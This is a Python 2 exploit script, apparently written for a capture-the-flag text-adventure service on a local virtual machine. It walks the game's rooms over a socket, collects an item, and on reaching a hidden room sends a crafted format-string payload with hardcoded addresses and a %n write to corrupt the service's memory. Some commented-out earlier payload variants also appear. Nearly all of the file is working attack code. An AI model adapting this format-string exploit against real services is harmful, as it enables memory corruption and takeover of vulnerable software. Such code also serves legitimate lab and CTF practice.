#!/usr/bin/python

import socket
#804ae60

#fstr = '\x74\xD3\x04\x08' + "%08x%n" +'A'*(512-6-4-2) + 'X\n'
#fstr = '\xCC\xCC\xCC\xCC' + '\x74\xD3\x04\x08' + "%134524504x%3$n" +'A'*(256+256-26) + 'X\n'
fstr = '\xCC\xCC\xCC\xCC' + 'A'*40 + '\x74\xD3\x04\x08' + "%134524464x%13$n" +'A'*(256+256-26-40-1) + 'X\n'

service_port = 2069
ip = "fe80::20c:29ff:fe7b:eb55%vmnet1"
bufsize= 8*1024

def sendcommand(s,c):
	print "Sending command",c
	s.send(c)

def isFormatStringRoom(data):
	return data.find('anything around') != -1

def isGoldRoom(data):
	return data.find('pieces of gold') != -1

def roomContainsLadder(data):
	for line in data.split('\n'):
		if line.startswith('You can see'):
			return data.find('ladder') != -1
	return False

def roomContainsSledge(data):
	for line in data.split('\n'):
		if line.startswith('You can see'):
			return data.find('sledge') != -1
	return False

def pickupLadder(s):
	while True:
		sendcommand(s,'X')
		data = recievestatus(s)
		for line in data.split('\n'):
			if line.startswith('You can see') and line.endswith('ladder'):
				print 'Picking up ladder'
				sendcommand(s,'g')
				return

def pickupSledge(s):
	while True:
		sendcommand(s,'X')
		data = recievestatus(s)
		for line in data.split('\n'):
			if line.startswith('You can see') and line.endswith('sledge'):
				print 'Picking up sledge'
				sendcommand(s,'g')
				data = recievestatus(s)
				print 'Arming sledge'
				sendcommand(s,'a')
				data = recievestatus(s)
				return
				

directions = 'nesswwnnwssseee'

def go(s, direction):
	# use hammer
	sendcommand(s,'h')
	recievestatus2(s)
	# break wall
	sendcommand(s,direction)
	recievestatus(s)
	# go to next room
	sendcommand(s,direction)

def recievestatus(s):
	data = ""
	while not ">" in data and data.find("pieces of gold") == -1:
		data +=s.recv(bufsize)
	print data
	return data

def recievestatus2(s):
	data = ""
	while data.count(".") != 3:
		data +=s.recv(bufsize)
	print data
	return data

def recievestatus3(s):
	data = ""
	while data.count("\n") != 1:
		data +=s.recv(bufsize)
	print data
	return data

def main():
	equipped_with_ladder = False
	equipped_with_sledge = False

	s = socket.create_connection((ip, service_port))

	raw_input("Press Enter to continue...")

	i=0
	while True:
		data = recievestatus(s)
		if isGoldRoom(data):
			print "sploit failed :("
			return
		if isFormatStringRoom(data):
			print "Found secret room!\n", data
			sendcommand(s,fstr)
			data = ""
			while 'X' not in data:
				go(s, directions[i])
				data = recievestatus(s)
			while True:
				sendcommand(s,'g')
				data = recievestatus(s)
				for line in data.split('\n'):
					if line.startswith('You are carry') and line.endswith('X'):
						sendcommand(s,'a')
						recievestatus3(s)
						print "sploited"
						return
			continue
#		if not equipped_with_ladder:
#			if roomContainsLadder(data):
#				print "picking up ladder"
#				pickupLadder(s)
#				data = recievestatus(s)
#				equipped_with_ladder = True
		if not equipped_with_sledge:
			if roomContainsSledge(data):
				print "picking up sledge"
				pickupSledge(s)
				equipped_with_sledge = True

		go(s, directions[i])

		i += 1
		if i == 14:
			print 'secret room not found :('
			break
	print 'done'
		

main()
